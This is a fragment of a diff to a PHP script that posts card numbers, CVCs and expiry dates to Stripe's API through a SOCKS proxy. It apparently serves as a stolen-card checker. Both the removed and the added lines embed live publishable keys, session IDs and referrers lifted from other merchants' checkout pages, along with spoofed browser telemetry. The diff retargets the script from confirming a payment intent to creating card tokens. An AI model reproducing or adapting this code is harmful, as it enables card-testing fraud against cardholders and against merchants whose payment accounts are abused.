@@ -71,7 +71,7 @@ $ch = curl_init();
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 ////////=========Socks Proxy
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_1GRWq8E4tYs4RDEOqHciA1ik/confirm');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
@@ -90,7 +90,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]='.$name.'+'.$last.'&payment_method_data[billing_details][address][city]'.$city.'&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]='.$street.'&payment_method_data[billing_details][address][line2]='.$street.'&payment_method_data[billing_details][address][postal_code]='.$postcode.'&payment_method_data[billing_details][address][state]=&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=NA&payment_method_data[muid]=2c91d784-e260-433c-af7d-f80594049566&payment_method_data[sid]=669586cf-24f5-40fb-bb4e-3e436869ecc5&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fd6141c83%3B+stripe-js-v3%2Fd6141c83&payment_method_data[time_on_page]=157083&payment_method_data[referrer]=https%3A%2F%2Fwww.firststopdarlington.org.uk%2Fpages%2Fpayment%2Fcredit-card%2F%3Fid%3D90cd168d-3b99-4c92-9350-b79e45a4e6c5%26mobile-wallet%3D0&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_kNjVS2LjGuJSPJPX1EtiZC1X&client_secret=pi_1GRWq8E4tYs4RDEOqHciA1ik_secret_1tKXFus0msHnWKbgegORn07d9');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=c32ea8ce-7441-43c0-9448-e50fb6447e3f&muid=6e7e5ab6-d9fa-4d6f-8edd-7cd5f7102bf0&sid=218b624b-ce6e-4ca3-abce-b6c638afb58b&payment_user_agent=stripe.js%2Fd6141c83%3B+stripe-js-v3%2Fd6141c83&time_on_page=81193&referrer=https%3A%2F%2Fwww.brandcrowd.com%2Fmaker%2Fcheckout%2F8576dee8-b290-4e6d-baa5-822706444886&key=pk_live_Lk2wcr8WKXEORwr4he3GSzEL&pasted_fields=number');
 $result = curl_exec($ch);
 
 ///$token = trim(strip_tags(getStr($result,'"id": "','"')));
